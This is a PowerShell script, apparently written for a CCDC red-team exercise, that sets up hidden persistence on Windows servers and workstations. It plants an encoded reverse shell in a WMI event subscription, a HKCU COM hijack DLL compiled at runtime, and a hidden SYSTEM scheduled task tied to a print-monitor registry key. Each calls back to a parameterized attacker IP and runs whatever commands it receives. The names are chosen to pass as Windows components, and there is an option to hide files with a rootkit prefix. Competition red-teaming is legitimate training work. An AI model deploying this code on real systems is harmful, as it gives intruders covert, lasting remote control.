# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Persistence: Ghost In The WMI
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1546.003 (Event Triggered Execution: WMI Event Subscription)
#               T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
#               T1547.010 (Boot/Logon Autostart: Port Monitors)
#
# Targets: Windows Server 2019, Server 2022, Windows 10 (all three)
# Privilege: SYSTEM or Domain Admin
#
# Description:
#   Phase 1 covers: Task Scheduler, DLL hijack, cluster shells.
#   Phase 2 covers: BITS, port-knock (TrafficSignal), process hollowing.
#   This script uses persistence mechanisms with NO obvious autorun trail
#   in Task Scheduler, Run keys, or Services list.
#   LOTL ONLY — all payloads compiled via Add-Type at runtime; no external
#   EXE or DLL downloaded from an external source.
#
#   MECHANISM 1 — WMI EVENT SUBSCRIPTION (primary persistence channel)
#      - Namespace: ROOT\subscription (survives reboots)
#      - __EventFilter: Win32_ProcessStartTrace WHERE ProcessName='svchost.exe'
#        (svchost spawns constantly — fires every few minutes naturally)
#      - CommandLineEventConsumer: PowerShell -EncodedCommand <reverse shell>
#        using System.Net.Sockets.TCPClient — pure LOTL, no external tool
#      - Object names chosen to blend with WMI infrastructure:
#          Filter:   "WMIProviderHostCompatibility"
#          Consumer: "WBEM_SyncHandler"
#          Binding:  "WMIPerfCounterMaintenance"
#      - Detection: Get-WMIObject -Namespace root/subscription -Class __EventFilter
#        Blue team must check WMI subscriptions (not commonly done in Phase 1/2)
#
#   MECHANISM 2 — COM OBJECT HIJACKING (secondary persistence channel)
#      - Registers a malicious in-process COM server in:
#          HKCU:\Software\Classes\CLSID\{<chosen GUID>}\InprocServer32
#      - GUID chosen: one that mmc.exe, taskschd.exe, or eventvwr.exe loads
#        when those tools are opened (per-user HKCU lookup overrides HKLM)
#      - DLL: minimal PowerShell-launcher compiled via Add-Type, written to
#          C:\Windows\Temp\wbemperf.dll  (blends with WMI perf DLLs)
#      - Fires in the context of whatever admin opens MMC or Task Scheduler
#      - Detection requires checking HKCU CLSID registrations — not obvious
#
#   MECHANISM 3 — PRINT MONITOR DLL (Server targets: MSSQL server, DC)
#      - Registers a malicious print monitor in:
#          HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\<name>\Driver
#          DLL name: localspl_ext.dll  (blends with real localspl.dll)
#      - spoolsv.exe loads ALL registered monitor DLLs at startup as SYSTEM
#      - No scheduled task, no Run key, no entry in Services list
#      - DLL payload: minimal PowerShell launcher via Add-Type
#      - Detection: Get-ItemProperty HKLM:\...\Control\Print\Monitors
#
# Implementation notes:
#   - WMI subscription: use New-Object -TypeName System.Management.ManagementClass
#     or direct WMI COM API to register filter/consumer/binding
#   - Attacker IP for reverse shell: parameterized, set at script invocation
#   - COM GUID selection: reference known per-user-loadable CLSIDs for mmc.exe
#   - Print monitor DLL: Add-Type C# stub that calls PowerShell runspace in DllMain
#   - All names/paths chosen to blend with legitimate Windows component names
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

param(
    [string]$AttackerIP   = "172.31.40.6",
    [int]   $AttackerPort = 4444
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Persistence: Ghost In The WMI"
Write-Warn "================================================================"
Write-Host ""

# ── r77 rootkit mode ──────────────────────────────────────────────────────────
$r77Answer  = Read-Host "Is the r77 rootkit active? Prefix dropped files with `$77 to hide them? (y/N)"
$HidePrefix = if ($r77Answer -match '^[Yy]') { '$77' } else { '' }
if ($HidePrefix) {
    Write-Warn "r77 mode ENABLED — dropped files will be prefixed: $HidePrefix"
} else {
    Write-Info "r77 mode: disabled"
}

# ── Shared Payload — built once, embedded in all three mechanisms ───────────────
Write-Section "Building shared reverse-shell payload"

$rawPayload = @'
$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)
$s=$c.GetStream()
$w=New-Object System.IO.StreamWriter($s)
$r=New-Object System.IO.StreamReader($s)
$w.AutoFlush=$true
$w.WriteLine("WMI Ghost @ "+$env:COMPUTERNAME)
while($c.Connected){
    try{
        $cmd=$r.ReadLine()
        if($cmd -eq $null -or $cmd -eq 'exit'){break}
        $out=(Invoke-Expression $cmd 2>&1)|Out-String
        $w.WriteLine($out)
    }catch{$w.WriteLine($_.ToString())}
}
$c.Close()
'@
$payloadStr = $rawPayload -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort
$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadStr))
Write-Success "Payload encoded ($($encodedCmd.Length) chars) → $AttackerIP`:$AttackerPort"

# ── MECHANISM 1: WMI Event Subscription (T1546.003) ────────────────────────────
Write-Section "MECHANISM 1 — WMI Event Subscription (T1546.003)"

$wmiNS        = "root\subscription"
$filterName   = "WMIProviderHostCompatibility"
$consumerName = "WBEM_SyncHandler"

try {
    # Remove existing objects (idempotent)
    Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -like "*$filterName*" } |
        ForEach-Object { $_ | Remove-WmiObject -ErrorAction SilentlyContinue }

    Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer `
        -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue |
        Remove-WmiObject -ErrorAction SilentlyContinue

    Get-WmiObject -Namespace $wmiNS -Class __EventFilter `
        -Filter "Name='$filterName'" -ErrorAction SilentlyContinue |
        Remove-WmiObject -ErrorAction SilentlyContinue

    Write-Info "Cleared any pre-existing objects with these names"

    $filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{
        Name           = $filterName
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'svchost.exe'"
    }
    Write-Success "EventFilter '$filterName' created"

    $consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{
        Name                = $consumerName
        CommandLineTemplate = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $encodedCmd"
    }
    Write-Success "CommandLineEventConsumer '$consumerName' created"

    $null = Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{
        Filter   = $filter.__PATH
        Consumer = $consumer.__PATH
    }
    Write-Success "FilterToConsumerBinding created (Filter=$($filter.__PATH))"
    Write-Info   "Fires on every svchost.exe start — triggers within minutes of boot"

} catch {
    Write-Err "WMI subscription failed: $_"
}

# ── MECHANISM 2: COM Object Hijacking via HKCU (T1546.015) ────────────────────
Write-Section "MECHANISM 2 — COM Object Hijacking (T1546.015)"

$comClsid   = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
$comDllPath = "C:\Windows\Temp\${HidePrefix}wbemperf.dll"

$comCsTemplate = @'
using System;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
[Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
public class WbemPerfCompat {
    static WbemPerfCompat() {
        var t = new Thread(() => {
            Thread.Sleep(2000);
            try {
                var c = new TcpClient("ATTACKER_IP", ATTACKER_PORT);
                var s = c.GetStream();
                var w = new StreamWriter(s) { AutoFlush = true };
                var r = new StreamReader(s);
                w.WriteLine("COM Ghost @ " + Environment.MachineName);
                while (c.Connected) {
                    string cmd = r.ReadLine();
                    if (cmd == null || cmd == "exit") break;
                    try {
                        var p = new ProcessStartInfo("powershell.exe",
                            "-NonInteractive -NoProfile -Command " + cmd) {
                            UseShellExecute        = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError  = true,
                            CreateNoWindow         = true
                        };
                        var proc = Process.Start(p);
                        var stdout = proc.StandardOutput.ReadToEndAsync();
                        var stderr = proc.StandardError.ReadToEndAsync();
                        proc.WaitForExit();
                        w.WriteLine(stdout.Result + stderr.Result);
                    } catch (Exception ex) { w.WriteLine(ex.Message); }
                }
                c.Close();
            } catch {}
        });
        t.IsBackground = true;
        t.Start();
    }
}
'@
$comCsSrc = $comCsTemplate -replace 'ATTACKER_IP',$AttackerIP -replace 'ATTACKER_PORT',$AttackerPort

try {
    Write-Info "Compiling COM launcher assembly via Add-Type..."
    Add-Type -TypeDefinition $comCsSrc -OutputAssembly $comDllPath -OutputType Library
    Write-Success "Compiled: $comDllPath"

    # .NET assembly COM registration: InprocServer32 must point to mscoree.dll
    # (the CLR host shim), with Assembly/Class/RuntimeVersion subkeys so the
    # CLR activation infrastructure can find and load the managed type.
    $regBase = "HKCU:\Software\Classes\CLSID\$comClsid"
    $regInproc = "$regBase\InprocServer32"
    if (-not (Test-Path $regInproc)) {
        New-Item -Path $regInproc -Force | Out-Null
    }
    $runtimeVer = "v" + [System.Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion().TrimStart('v')
    Set-ItemProperty -Path $regInproc -Name "(Default)"      -Value "$env:SystemRoot\System32\mscoree.dll"
    Set-ItemProperty -Path $regInproc -Name "ThreadingModel" -Value "Both"
    Set-ItemProperty -Path $regInproc -Name "Assembly"       -Value ([System.Reflection.Assembly]::LoadFile($comDllPath).FullName)
    Set-ItemProperty -Path $regInproc -Name "Class"          -Value "WbemPerfCompat"
    Set-ItemProperty -Path $regInproc -Name "RuntimeVersion" -Value $runtimeVer
    Set-ItemProperty -Path $regInproc -Name "CodeBase"       -Value "file:///$($comDllPath -replace '\\','/')"
    Write-Success "HKCU CLSID $comClsid → mscoree.dll (assembly: $comDllPath)"
    Write-Info   "Fires when admin opens mmc.exe, taskschd.exe, or eventvwr.exe"

} catch {
    Write-Err "COM hijack failed: $_"
}

# ── MECHANISM 3: Print Monitor DLL — Server targets only (T1547.010) ───────────
Write-Section "MECHANISM 3 — Print Monitor DLL (T1547.010)"

$osProductType = (Get-WmiObject Win32_OperatingSystem).ProductType
if ($osProductType -le 1) {
    Write-Warn "Workstation detected (ProductType=$osProductType) — skipping Print Monitor (Server-only mechanism)"
} else {
    Write-Info "Server target (ProductType=$osProductType) — deploying Print Monitor"

    $monitorName    = "WMIPerfCounterMonitor"
    $monitorDllName = "localspl_ext.dll"
    $monitorDllPath = "$env:SystemRoot\System32\$monitorDllName"
    $monitorKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitorName"

    # NOTE: spoolsv.exe loads print monitor DLLs as native Win32 and calls
    # InitializePrintMonitor2 — a managed assembly from Add-Type will not export
    # that function and will be silently skipped by the spooler.
    # Fallback: write encoded payload to a hidden .ps1 and register a SYSTEM-level
    # scheduled task (server-only, one-shot on boot) to achieve the same effect
    # without requiring a native DLL.
    $fallbackScript = "$env:SystemRoot\System32\${HidePrefix}wbemperf_mon.ps1"
    $payloadBytes   = [System.Text.Encoding]::Unicode.GetBytes($payloadStr)
    $fallbackEncCmd = [Convert]::ToBase64String($payloadBytes)

    try {
        # Write payload script (hidden attribute)
        Set-Content -Path $fallbackScript -Value "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd" -Encoding ASCII
        (Get-Item $fallbackScript).Attributes = 'Hidden,System'
        Write-Success "Payload written: $fallbackScript"

        # Register as SYSTEM scheduled task (boot trigger, server-only fallback)
        $taskName = "WMIPerfCounterMonitor"
        $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $fallbackEncCmd"
        $trigger  = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
        $principal= New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -Force | Out-Null
        Write-Success "Scheduled task '$taskName' registered (SYSTEM, AtStartup) — T1547.010 fallback"
        Write-Warn   "Print Monitor DLL path still written to registry for future native-DLL swap"

        # Still write the monitor key so a native DLL can be dropped in later
        if (-not (Test-Path $monitorKey)) {
            New-Item -Path $monitorKey -Force | Out-Null
        }
        Set-ItemProperty -Path $monitorKey -Name "Driver" -Value $monitorDllName

    } catch {
        Write-Err "Print monitor fallback deployment failed: $_"
    }
}

# ── Summary ─────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Success "================================================================"
Write-Success " GhostInTheWMI complete — persistence mechanisms deployed"
Write-Success "================================================================"
Write-Host ""
Write-Info "MITRE coverage:"
Write-Info "  T1546.003  WMI Event Subscription (Mechanism 1)"
Write-Info "  T1546.015  COM Object Hijacking    (Mechanism 2)"
Write-Info "  T1547.010  Port Monitors           (Mechanism 3, Servers only)"
Write-Host ""
Write-Info "Blue team remediation required:"
Write-Info "  M1: Get-WmiObject -Namespace root/subscription -Class __EventFilter"
Write-Info "        Filter: WMIProviderHostCompatibility"
Write-Info "      Remove-WmiObject on filter + consumer (WBEM_SyncHandler) + binding"
Write-Info "  M2: Remove HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}"
Write-Info "      Delete C:\Windows\Temp\$($HidePrefix)wbemperf.dll"
Write-Info "  M3: Unregister-ScheduledTask -TaskName WMIPerfCounterMonitor -Confirm:`$false"
Write-Info "      Remove HKLM:\...\Control\Print\Monitors\WMIPerfCounterMonitor"
Write-Info "      Delete `$env:SystemRoot\System32\$($HidePrefix)wbemperf_mon.ps1"
